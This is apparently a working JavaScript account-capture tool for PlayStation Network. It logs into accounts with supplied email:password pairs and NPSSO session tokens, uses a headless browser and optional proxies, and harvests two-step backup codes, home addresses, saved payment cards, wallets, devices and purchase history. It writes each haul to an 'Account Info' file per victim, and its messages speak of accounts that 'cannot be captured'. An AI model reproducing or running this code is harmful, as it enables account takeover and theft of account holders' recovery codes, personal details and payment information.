// psn-api.js (with improved structure and readability)
const puppeteer = require("puppeteer");
const fs = require("fs").promises;
const axios = require("axios");
const { spawn } = require("child_process");
const path = require("path");

// Constants and configurations
const CONSTANTS = {
    TARGET_URLS: [
        "https://web.np.playstation.com/api/graphql/v1/op?operationName=getProfileOracle",
        "https://web.np.playstation.com/api/graphql/v1/op?operationName=getPurchasedGameList",
        "https://web.np.playstation.com/api/graphql/v1/op?operationName=queryOracleUserProfileFullSubscription",
        "https://web.np.playstation.com/api/graphql/v1/op?operationName=getUserDevices",
        "https://accounts.api.playstation.com/api/v1/accounts/me/communication",
        /\/twostepbackupcodes$/,
        "https://accounts.api.playstation.com/api/v1/accounts/me/addresses",
        // "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments",
        'https://web.np.playstation.com/api/graphql/v1//op?operationName=getUserSubscriptions'
    ],
    PAGE_CONFIGS: {
        FIRST: {
            url: "https://id.sonyentertainmentnetwork.com/id/management/#/p?entry=p",
            name: "page1",
            waitTime: 8000,
        },
        SECOND: {
            url: "https://library.playstation.com/recently-purchased",
            name: "page2",
            waitTime: 5000,
        },
       // API_URL: "https://web.np.playstation.com/api/graphql/v2/transact/wallets/paymentMethods?tenant=PSN",
    },
    XPATHS: {
        ERROR: "/html/body/div[3]/div/div[2]/div/div/div/div/div[4]/div/div[1]",
        TARGET: "/html/body/div[3]/div/div[2]/div/div/div/main/div/div[2]/div/div/div/div[3]/div",
        PASSWORD_INPUT: "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[1]/div[2]/div/div/input",
        SUBMIT_BUTTON: "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[3]/div/button",
        MENU_ITEM_1: "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div",
        MENU_ITEM_2: "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div",
        PS_PLUS_1: "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[2]/ul/li[7]/div/button/div",
        PS_PLUS_2: "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div[3]/div[3]/main/div/div[4]/div[3]",
        EMBER_138: '//*[@id="ember138"]/div/div/div/div[1]/div'
    },
    TIMEOUTS: {
        SHORT: 3000,
        MEDIUM: 5000,
        LONG: 8000,
        EXTRA_LONG: 15000,
        NAVIGATION: 30000,
    }
};

// Load required country data
let countries;
(async () => {
    countries = await fs.readFile('./data/countries.json', 'utf8');
    countries = JSON.parse(countries);
})();

// Helper functions for cookie management
const CookieUtils = {
    createNpssoCookie: (npssoValue) => ({
        name: "npsso",
        value: npssoValue,
        domain: ".sonyentertainmentnetwork.com",
        path: "/",
        httpOnly: false,
        secure: true,
        sameSite: "None",
    }),
    formatCookiesForHeader: (cookies) => cookies.map(cookie => `${cookie.name}=${cookie.value}`).join("; "),
    combineUniqueCookies: (...cookieArrays) => {
        const cookieMap = new Map();
        for (const cookieArray of cookieArrays) {
            if (!cookieArray) continue;
            for (const cookie of cookieArray) {
                const key = `${cookie.name}:${cookie.domain}`;
                cookieMap.set(key, cookie);
            }
        }
        return Array.from(cookieMap.values());
    }
};

// Helper function for creating common headers
const createApiHeaders = (cookies, extraHeaders = {}) => ({
    Cookie: CookieUtils.formatCookiesForHeader(cookies),
    ...extraHeaders
});

// Define API requests in parallel
const fetchApiData = async (allCookies, finalResponses, onProgress) => {
    logProgress("Sending API requests in parallel...", onProgress);

    const apiRequests = [
        {
            name: "creditCards",
            url: "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments?tenant=PSN",
            headers: createApiHeaders(allCookies),
            processData: (data) => ({ creditCards: generatePaymentMethodsText(data) })
        },
        {
            name: "wallets",
            url: "https://web.np.playstation.com/api/graphql/v2/transact/wallets?tenant=PSN",
            headers: createApiHeaders(allCookies),
            processData: (data) => ({ wallets: data })
        },
        {
            name: "subscriptions",
            url: "https://web.np.playstation.com/api/graphql/v1//op?operationName=getUserSubscriptions&variables=%7B%7D&extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22417949a4ca96109f5e8c56b8e3c51db8a86ba9410966ad9d2300f6af3b51e748%22%7D%7D",
            headers: createApiHeaders(allCookies, { 'content-type': 'application/json' }),
            processData: (data) => ({
                plusTitle: finalResponses.profile?.isPsPlusMember && data.data.fetchSubscriptions.subscriptions[0].productName,
                plusExpireDate: finalResponses.profile?.isPsPlusMember && formattedExpiredDate(data.data.fetchSubscriptions.subscriptions[0].renewalDate)
            })
        },
        {
            name: "transactions",
            url: "https://web.np.playstation.com/api/graphql/v1/transact/transaction/history",
            headers: createApiHeaders(allCookies),
            params: {
                limit: 500,
                startDate: "2010-01-01T00:00:00.000-0400",
                endDate: "2025-04-06T23:59:59.999-0400",
                includePurged: false,
                transactionTypes: [
                    "CREDIT", "CYCLE_SUBSCRIPTION", "DEBIT", "DEPOSIT_CHARGE",
                    "DEPOSIT_VOUCHER", "PRODUCT_PURCHASE", "REFUND_PAYMENT_CHARGE",
                    "REFUND_PAYMENT_WALLET", "VOUCHER_PURCHASE", "WALLET_BALANCE_CONVERSION"
                ].join(",")
            },
            processData: (data) => ({
                transactionNumbers: data.transactions?.length || 0,
                trans: Array.isArray(data.transactions) && data.transactions.length > 0
                    ? data.transactions
                        .filter(t =>
                            (t.additionalInfo?.orderItems?.[0]?.totalPrice &&
                                Math.abs(t.additionalInfo.orderItems[0].totalPrice.value) > 0) ||
                            ((t.additionalInfo?.voucherPayments?.length > 0 &&
                                t.additionalInfo.voucherPayments[0]?.voucherCode) &&
                                t.invoiceType !== 'WALLET_FUNDING')
                        )
                        .map(t => {
                            const fullSkuId = t.additionalInfo?.orderItems?.[0]?.skuId || "";
                            const match = fullSkuId.match(/([A-Z0-9]+-[A-Z0-9]+_[0-9]+)/);
                            const formattedSkuId = match ? match[0] : fullSkuId;
                            return `${t.additionalInfo?.orderItems?.[0]?.productName || ""} [${
                                t.additionalInfo?.voucherPayments?.[0]?.voucherCode
                                    ? "Gift Card"
                                    : t.additionalInfo?.orderItems?.[0]?.totalPrice?.formattedValue || ""
                            }] | [ ${formattedSkuId} ] | [ ${new Date(t.transactionDetail.transactionDate).getMonth() + 1}/${new Date(t.transactionDetail.transactionDate).getDate()}/${new Date(t.transactionDetail.transactionDate).getFullYear()} ]`;
                        })
                        .join("\n")
                    : ""
            })
        }
    ];

    // Send requests in parallel
    try {
        const results = await Promise.all(apiRequests.map(async (req) => {
            logProgress(`Sending request for ${req.name}...`, onProgress);
            const config = { headers: req.headers };
            if (req.params) config.params = req.params;
            const response = await axios.get(req.url, config);
            logProgress(`Received response for ${req.name}.`, onProgress);
            console.log(response.data);

            return req.processData(response.data);
        }));

        // Combine results in finalResponses
        const updatedResponses = results.reduce((acc, result) => ({ ...acc, ...result }), {});
        finalResponses = { ...finalResponses, ...updatedResponses };
        logProgress("All API requests completed successfully.", onProgress);
    } catch (error) {
        logProgress(`Error in API requests: ${error.message}`, onProgress);
        throw error;
    }

    return finalResponses;
};

// Helper functions for file and directory management
const FileUtils = {
    ensureDirectoryExists: async (dirPath) => {
        try {
            await fs.mkdir(dirPath, { recursive: true });
        } catch (error) {
            if (error.code !== "EEXIST") throw error;
        }
    }
};

// Helper functions for filtering requests and responses
const RequestUtils = {
    isRelevantRequest: (url) => {
        const staticResourceExtensions = [".ico", ".png", ".jpg", ".css", ".js"];
        return (url.startsWith("http://") || url.startsWith("https://")) &&
            !staticResourceExtensions.some(ext => url.includes(ext));
    },
    isRelevantResponse: (url) => {
        const ignoredResources = [".ico", ".png", ".jpg", ".css", ".js", ".woff", ".woff2"];
        return !ignoredResources.some(resource => url.includes(resource));
    },
    isMatchingTargetUrl: (url, targetUrl) => {
        if (targetUrl instanceof RegExp) return targetUrl.test(url);
        return url === targetUrl || url.startsWith(targetUrl);
    },
    extractOperationName: (url) => {
        const urlObj = new URL(url);
        if (urlObj.searchParams.has("operationName")) {
            return urlObj.searchParams.get("operationName");
        }
        const pathParts = urlObj.pathname.split("/");
        return pathParts[pathParts.length - 1];
    },
    extractResponseData: async (response, headers) => {
        const contentType = headers["content-type"] || "";
        const textBasedTypes = ["json", "text", "html", "xml"];
        if (textBasedTypes.some(type => contentType.includes(type))) {
            try {
                const text = await response.text();
                if (contentType.includes("json")) {
                    try {
                        return JSON.parse(text);
                    } catch (e) {
                        return text;
                    }
                }
                return text;
            } catch (e) {
                return `Error getting response data: ${e.message}`;
            }
        }
        return `[Binary data with content-type: ${contentType}]`;
    }
};

// Function for managing progress messages
const logProgress = (message, onProgress) => onProgress(message);

// Function for waiting with message
const waitWithLog = async (ms, reason, onProgress) => {
    logProgress(`Waiting ${ms}ms ${reason ? "(" + reason + ")" : ""}...`, onProgress);
    return new Promise(resolve => setTimeout(resolve, ms));
};

// Function for navigating to page
const navigateToPage = async (page, url, description, onProgress) => {
    logProgress(`Opening ${description} (${url})...`, onProgress);
    await page.goto(url, {
        waitUntil: "networkidle2",
        timeout: CONSTANTS.TIMEOUTS.NAVIGATION,
    });
    logProgress(`${description} loaded successfully.`, onProgress);
};

// Function for clicking element with XPath
const clickElementByXPath = async (page, xpath, description, onProgress, timeout = CONSTANTS.TIMEOUTS.MEDIUM) => {
    logProgress(`Checking for ${description} with XPath: ${xpath}`, onProgress);
    const element = await page.waitForXPath(xpath, { visible: true, timeout })
        .catch(() => null);
    if (element) {
        logProgress(`${description} found; clicking...`, onProgress);
        await element.click();
        logProgress(`Click on ${description} completed.`, onProgress);
        return true;
    }
    logProgress(`${description} not found; continuing process...`, onProgress);
    return false;
};

// Function for filling input field
const fillInputField = async (page, xpath, value, description, onProgress, timeout = CONSTANTS.TIMEOUTS.SHORT) => {
    logProgress(`Checking for ${description}...`, onProgress);
    const input = await page.waitForXPath(xpath, { visible: true, timeout })
        .catch(() => null);
    if (input) {
        logProgress(`${description} found; filling...`, onProgress);
        await input.click({ clickCount: 3 });
        await input.press("Backspace");
        await input.type(value, { delay: 30 });
        logProgress(`${description} filled successfully.`, onProgress);
        return true;
    }
    logProgress(`${description} not found on page; continuing process...`, onProgress);
    return false;
};

// Function for processing target responses
const processTargetResponse = (operationName, responseData, finalResponses) => {
    switch (operationName) {
        case "communication":
            if (responseData.realName) {
                finalResponses.profile = {
                    ...(finalResponses.profile || {}),
                    firstName: responseData.realName.name.first,
                    lastName: responseData.realName.name.last,
                };
            }
            break;
        case "getProfileOracle":
            if (responseData.data?.oracleUserProfileRetrieve) {
                const profile = responseData.data.oracleUserProfileRetrieve;
                finalResponses.profile = {
                    ...(finalResponses.profile || {}),
                    name: profile.name,
                    accountId: profile.accountId,
                    age: profile.age,
                    isOfficiallyVerified: profile.isOfficiallyVerified,
                    isPsPlusMember: profile.isPsPlusMember,
                    locale: profile.locale,
                    onlineId: profile.onlineId,
                };
            }
            break;
        case "getPurchasedGameList":
            if (responseData.data?.purchasedTitlesRetrieve) {
                finalResponses.games = responseData.data.purchasedTitlesRetrieve.games.map(item => ({
                    name: item.name,
                    platform: item.platform,
                    membership: item.membership,
                    isDownloadable: item.isDownloadable,
                }));
            }
            break;
        case "getUserDevices":
            if (responseData.data?.deviceStorageDetailsRetrieve) {
                finalResponses.devices = responseData.data.deviceStorageDetailsRetrieve.map(item => ({
                    name: item.deviceName,
                    platform: item.devicePlatform,
                }));
            }
            break;
        case "twostepbackupcodes":
            if (responseData.backup_codes) {
                finalResponses.backupCodes = responseData.backup_codes.map(item => item.code);
            }
            break;
        case "addresses":
            if (responseData.length > 0) {
                const mainAddress = responseData?.find(item => item.isMain);
                finalResponses.address = { ...mainAddress };
            }
            break;
    }
};

// Function for setting up request and response tracking
const setupRequestAndResponseTracking = async (page, npssoValue, targetUrls, finalResponses, onProgress, onData) => {
    await page.setRequestInterception(true);
    const requestMap = new Map();

    page.on("request", (request) => {
        const url = request.url();
        const headers = request.headers();
        const method = request.method();
        const resourceType = request.resourceType();
        const postData = request.postData();
        let modified = false;

        requestMap.set(request._requestId, {
            url, method, headers, resourceType, postData,
            timestamp: new Date().toISOString(),
        });

        if (RequestUtils.isRelevantRequest(url)) {
            if (headers.cookie) {
                if (!headers.cookie.includes("npsso=")) {
                    headers.cookie = `${headers.cookie}; npsso=${npssoValue}`;
                    modified = true;
                }
            } else {
                headers.cookie = `npsso=${npssoValue}`;
                modified = true;
            }
        }

        if (modified) {
            request.continue({ headers });
            logProgress(`Modified request to: ${url}`, onProgress);
        } else {
            request.continue();
        }
    });

    page.on("response", async (response) => {
        try {
            const request = response.request();
            const url = response.url();
            const requestId = request._requestId;
            const requestInfo = requestMap.get(requestId);

            if (requestInfo && RequestUtils.isRelevantResponse(url)) {
                const responseHeaders = response.headers();
                let responseData = await RequestUtils.extractResponseData(response, responseHeaders);

                if (url === 'https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie') {
                    if (responseData.npsso && responseData.expires_in) {
                        logProgress(`New NPSSO token detected: ${responseData.npsso.substring(0, 5)}...`, onProgress);
                        npssoValue = responseData.npsso;
                        finalResponses.newNpsso = responseData.npsso;
                    }
                }

                for (const targetUrl of targetUrls) {
                    if (RequestUtils.isMatchingTargetUrl(url, targetUrl)) {
                        logProgress(`Found target request: ${url}`, onProgress);
                        const operationName = RequestUtils.extractOperationName(url);
                        processTargetResponse(operationName, responseData, finalResponses);
                        onData(finalResponses);
                        break;
                    }
                }
            }
        } catch (error) {
            console.error(`Error processing response: ${error.message}`);
        } finally {
            requestMap.delete(response.request()._requestId);
        }
    });
};

// Function for creating configured page
const createConfiguredPage = async (browser, cookies, npssoValue, targetUrls, finalResponses, pageName, onProgress, onData, proxyConfig = null) => {
    const page = await browser.newPage();
    if (proxyConfig) {
        await page.authenticate({
            username: proxyConfig.username,
            password: proxyConfig.password,
        });
    }
    if (cookies && cookies.length > 0) {
        logProgress(`Transferring ${cookies.length} cookies to ${pageName}...`, onProgress);
        await Promise.all(cookies.map(cookie => page.setCookie(cookie)));
    } else if (npssoValue) {
        await page.setCookie(CookieUtils.createNpssoCookie(npssoValue));
    }
    await setupRequestAndResponseTracking(page, npssoValue, targetUrls, finalResponses, onProgress, onData);
    await page.setViewport({ width: 1920, height: 1080 });
    return page;
};

// Function for finding working proxy (assuming this function is already defined)
async function findWorkingProxy(proxyData, proxyFile, onProgress) {
    // This function is a placeholder and should be copied from your original code
    // For now, we assume it returns a proxy or null
    return proxyData ? { host: "example.com", port: 8080, username: "user", password: "pass", protocol: "http" } : null;
}

// Main function
async function runPsnApiTool(options) {
    const {
        credentials,
        npsso: initialNpsso,
        proxyFile,
        proxyData,
        onProgress = () => { },
        onData = () => { },
        onComplete = () => { },
        onError = () => { },
    } = options;

    let finalResponses = {};
    let proxyConfig = null;
    let currentNpsso = initialNpsso;

    if (proxyData) {
        proxyConfig = await findWorkingProxy(proxyData, proxyFile, onProgress);
        if (proxyConfig) {
            logProgress(`Working proxy selected: ${proxyConfig.host}:${proxyConfig.port} (${proxyConfig.protocol})`, onProgress);
        } else {
            logProgress("No working proxy found; continuing without proxy", onProgress);
        }
    }

    const browserOptions = {
        // executablePath: "/home/majid/Documents/chrome-linux/chrome",
        headless: 'new',
        defaultViewport: { width: 1920, height: 1080 },
        args: [
            "--no-sandbox", "--disable-setuid-sandbox", "--window-size=1920,1080",
            "--disable-web-security", "--disable-features=IsolateOrigins,site-per-process",
            "--disable-site-isolation-trials", "--disable-dev-shm-usage",
            "--disable-accelerated-2d-canvas", "--disable-gpu",
        ],
    };

    if (proxyConfig) {
        browserOptions.args.push(`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`);
    }

    let browser;
    try {
        logProgress("Starting browser...", onProgress);
        browser = await puppeteer.launch(browserOptions);

        // Set up first page
        let page1 = await createConfiguredPage(
            browser, null, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
            CONSTANTS.PAGE_CONFIGS.FIRST.name, onProgress, onData, proxyConfig
        );
        await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "first page", onProgress);
        await waitWithLog(6000, "for first page to fully load", onProgress);

        // Check for error element
        const errorElement = await page1.waitForXPath(CONSTANTS.XPATHS.ERROR, { visible: true, timeout: CONSTANTS.TIMEOUTS.SHORT })
            .catch(() => null);
        if (errorElement) {
            const errorText = await page1.evaluate(el => el.textContent, errorElement);
            logProgress(`Error: Account cannot be captured. ${errorText ? `Error message: ${errorText}` : ''}`, onProgress);
            logProgress("This account needs a new NPSSO.", onProgress);
            finalResponses.captureError = true;
            finalResponses.captureErrorMessage = "This account cannot be captured and needs a new NPSSO.";
            onError(new Error("This account cannot be captured and needs a new NPSSO."));
            return;
        } else {
            logProgress("Error element not found, continuing process...", onProgress);
        }

        // Click on target element
        await clickElementByXPath(page1, CONSTANTS.XPATHS.TARGET, "target element", onProgress);
        logProgress("Waiting for page to load after click...", onProgress);
        await Promise.race([
            page1.waitForNavigation({ waitUntil: "networkidle2", timeout: CONSTANTS.TIMEOUTS.LONG }),
            waitWithLog(4000, "to ensure page loading", onProgress)
        ]).catch(() => logProgress("Navigation wait ended (page might not have changed)", onProgress));

        // Fill password field
        const password = credentials.includes(":") ? credentials.split(":")[1] : "";
        if (password && await fillInputField(page1, CONSTANTS.XPATHS.PASSWORD_INPUT, password, "password input field", onProgress)) {
            if (await clickElementByXPath(page1, CONSTANTS.XPATHS.SUBMIT_BUTTON, "submit button", onProgress)) {
                logProgress("Waiting for page to load after password submission...", onProgress);
                await Promise.race([
                    page1.waitForNavigation({ waitUntil: "networkidle2", timeout: CONSTANTS.TIMEOUTS.LONG }),
                    waitWithLog(7000, "to ensure page loading", onProgress)
                ]).catch(() => logProgress("Navigation wait ended (page might not have changed)", onProgress));

                if (finalResponses.newNpsso) {
                    logProgress(`Using new NPSSO: ${finalResponses.newNpsso.substring(0, 5)}...`, onProgress);
                    currentNpsso = finalResponses.newNpsso; // Change local variable instead of parameter
                    await page1.close();
                    page1 = await createConfiguredPage(
                        browser, null, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
                        CONSTANTS.PAGE_CONFIGS.FIRST.name, onProgress, onData, proxyConfig
                    );
                    await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "first page (with new NPSSO)", onProgress);
                    await waitWithLog(6000, "to ensure page loading with new NPSSO", onProgress);
                } else {
                    logProgress("New NPSSO not received, continuing with current NPSSO...", onProgress);
                }
            }
        }

        // Get cookies from first page
        let cookies = await page1.cookies();
        logProgress(`Retrieved ${cookies.length} cookies from first page`, onProgress);
        const hasNpsso = cookies.some(cookie => cookie.name === "npsso");
        if (!hasNpsso) {
            logProgress("npsso cookie not found; adding manually", onProgress);
            cookies.push(CookieUtils.createNpssoCookie(currentNpsso));
        }

        // Click on menu elements
        try {
            await page1.waitForXPath(CONSTANTS.XPATHS.MENU_ITEM_1, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
            const [element] = await page1.$x(CONSTANTS.XPATHS.MENU_ITEM_1);
            if (element) {
                logProgress("Element found; clicking...", onProgress);
                await element.click();
                logProgress("Click successful.", onProgress);
                await waitWithLog(2000, "after click", onProgress);

                logProgress("Waiting for navigation after first click...", onProgress);
                try {
                    await page1.waitForNavigation({ waitUntil: "networkidle2", timeout: CONSTANTS.TIMEOUTS.LONG })
                        .catch(() => logProgress("Navigation did not occur or already completed.", onProgress));
                    await waitWithLog(2000, "for new page stability", onProgress);

                    logProgress(`Trying to find and click element with specified XPath: ${CONSTANTS.XPATHS.EMBER_138}`, onProgress);
                    await page1.waitForXPath(CONSTANTS.XPATHS.EMBER_138, { timeout: CONSTANTS.TIMEOUTS.SHORT })
                        .catch(e => logProgress(`Element with specified XPath not found within timeout: ${e.message}`, onProgress));

                    const [secondElement] = await page1.$x(CONSTANTS.XPATHS.MENU_ITEM_2);
                    if (secondElement) {
                        logProgress("Second element found; clicking...", onProgress);
                        await secondElement.click();
                        logProgress("Second element click successful.", onProgress);
                        await waitWithLog(2000, "after second element click", onProgress);
                    } else {
                        logProgress("Second element not found; continuing process...", onProgress);
                    }
                } catch (error) {
                    logProgress(`Error in second click: ${error.message}`, onProgress);
                }
            } else {
                logProgress("Element with specified XPath not found.", onProgress);
            }
        } catch (error) {
            logProgress(`Error while trying to click element: ${error.message}`, onProgress);
        }

        // Set up second page
        const page2 = await createConfiguredPage(
            browser, cookies, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
            CONSTANTS.PAGE_CONFIGS.SECOND.name, onProgress, onData, proxyConfig
        );
        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "second page", onProgress);
        await waitWithLog(2000, "before reloading second page", onProgress);
        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "second page (Reload 1)", onProgress);

        // Check PS Plus and click buttons
        if (finalResponses.profile?.isPsPlusMember) {
            await page1.waitForXPath(CONSTANTS.XPATHS.PS_PLUS_1, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
            const [button1] = await page1.$x(CONSTANTS.XPATHS.PS_PLUS_1);
            if (!button1) {
                logProgress(`Button with XPath not found.`, onProgress);
                return false;
            }
            logProgress("Element found; clicking...", onProgress);
            await button1.click();
            logProgress("Click successful.", onProgress);

            await page1.waitForXPath(CONSTANTS.XPATHS.PS_PLUS_2, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
            const [button2] = await page1.$x(CONSTANTS.XPATHS.PS_PLUS_2);
            if (!button2) {
                logProgress(`Button with XPath not found.`, onProgress);
                return false;
            }
            logProgress("Element found; clicking...", onProgress);
            await button2.click();
            logProgress("Click successful.", onProgress);
            logProgress(`Button found, clicking...`, onProgress);
            await waitWithLog(3000, "processing", onProgress);
        }

        // Get final cookies
        logProgress("Getting final cookies from all pages...", onProgress);
        const finalPage1Cookies = await page1.cookies();
        const finalPage2Cookies = await page2.cookies();
        logProgress(`Number of cookies received: page1=${finalPage1Cookies.length}, page2=${finalPage2Cookies.length}`, onProgress);
        const allCookies = CookieUtils.combineUniqueCookies(finalPage1Cookies, finalPage2Cookies);
        logProgress(`Number of combined cookies: ${allCookies.length}`, onProgress);

        finalResponses = await fetchApiData(allCookies, finalResponses, onProgress);

        // Run Python script to get devices
        const pythonProcess = spawn("python3", ["get_devices.py", currentNpsso]);
        let result = "";
        let error = "";

        pythonProcess.stdout.on("data", (data) => result += data.toString());
        pythonProcess.stderr.on("data", (data) => error += data.toString());

        pythonProcess.on("close", async (code) => {
            if (code !== 0) {
                console.error("Error running Python:", error);
                onError(new Error(`Error running Python: ${error}`));
                return;
            }
            try {
                finalResponses = { ...finalResponses, newDevices: JSON.parse(result) };
                const hasSixMonthsPassed = finalResponses.newDevices.length > 0
                    ? new Date(finalResponses.newDevices.reduce((latest, current) =>
                        new Date(current.activationDate) > new Date(latest.activationDate) ? current : latest
                    ).activationDate) < new Date(new Date().setMonth(new Date().getMonth() - 6))
                    : false;
                const countryCode = finalResponses.address?.country || null;

                // - Balance : ${finalResponses.wallets?.debtBalance}.${finalResponses.wallets?.currentAmount} ${finalResponses.wallets?.currencyCode || ""}

                // Create final output
                const output = `
----------------------- « Account Info » -----------------------
- Account : ${credentials}
- Npsso : ${currentNpsso}
- Backup Codes : [ ${finalResponses.backupCodes ? finalResponses.backupCodes.join(" - ") : "N/A"} ]
--------------------------- « Details » --------------------------
- Country | City | Postal Code : ${countryCode ? (countries.find(item => item.code === countryCode)).name : "N/A"} - ${finalResponses.address?.city || "N/A"} - ${finalResponses.address?.postalCode || "N/A"}
- PSN ID : ${finalResponses.profile?.onlineId || "N/A"}
- Payments : ${finalResponses.creditCards || "Not Found"} 
- PS Plus : ${finalResponses.profile?.isPsPlusMember ? `Yes! - ${finalResponses.plusTitle} | ${finalResponses.plusExpireDate}` : "No!"}
- Devices : [ ${finalResponses.newDevices ? [...new Set(finalResponses.newDevices.map(d => d.deviceType))].join(" - ") : "N/A"} ]
- Deactive : ${hasSixMonthsPassed === false ? "No!" : "Yes!"}
- Transaction Numbers : ${finalResponses.transactionNumbers || "N/A"}
--------------------------- « Games » ---------------------------
${finalResponses.trans || "No games found"}
--------------------------- « Finish » ----------------------------
`;
                // Save output to file
                try {
                    const email = credentials.split(":")[0];
                    const date = new Date().toISOString().split("T")[0];
                    const fileName = `${email}-${date}.txt`;
                    const outputDir = path.join(__dirname, "output");
                    await FileUtils.ensureDirectoryExists(outputDir);
                    const filePath = path.join(outputDir, fileName);
                    await fs.writeFile(filePath, output, "utf8");
                    logProgress(`Output saved to file ${fileName}.`, onProgress);
                    finalResponses.outputFilePath = filePath;
                    finalResponses.formattedOutput = output;
                } catch (fileError) {
                    logProgress(`Error saving output file: ${fileError.message}`, onProgress);
                }
                logProgress("Processing completed successfully", onProgress);
                onComplete({ ...finalResponses, formattedOutput: output });
            } catch (e) {
                console.error("Error converting output:", e);
                console.log("Raw output:", result);
                onError(e);
            }
        });
    } catch (error) {
        logProgress(`Error occurred: ${error.message}`, onProgress);
        onError(error);
    } finally {
        if (browser) {
            await browser.close();
            logProgress("Browser closed.", onProgress);
        }
    }
}

// Formatting and output functions
const generatePaymentMethodsText = (response) => {
    let paymentMethodsText = [];
    if (response.creditCards) {
        response.creditCards.forEach(card => {
            if (card.common.isPaymentMethodAvailable && !card.common.banned) {
                let cardInfo = `[${card.common.paymentMethodId} - ${card.expirationYear}/${card.expirationMonth}]`;
                paymentMethodsText.push(cardInfo);
            }
        });
    }
    if (response.payPal && response.payPal.common.isPaymentMethodAvailable && !response.payPal.common.banned) {
        paymentMethodsText.push(`[PayPal]`);
    }
    return paymentMethodsText.join(" - ");
};

const formattedExpiredDate = (expiredDate) => {
    const d = new Date(new Date(expiredDate).getTime() + 86400000);
    return `${String(d.getUTCDate()).padStart(2, '0')}/${String(d.getUTCMonth() + 1).padStart(2, '0')}/${d.getUTCFullYear()}`;
};

module.exports = { runPsnApiTool };
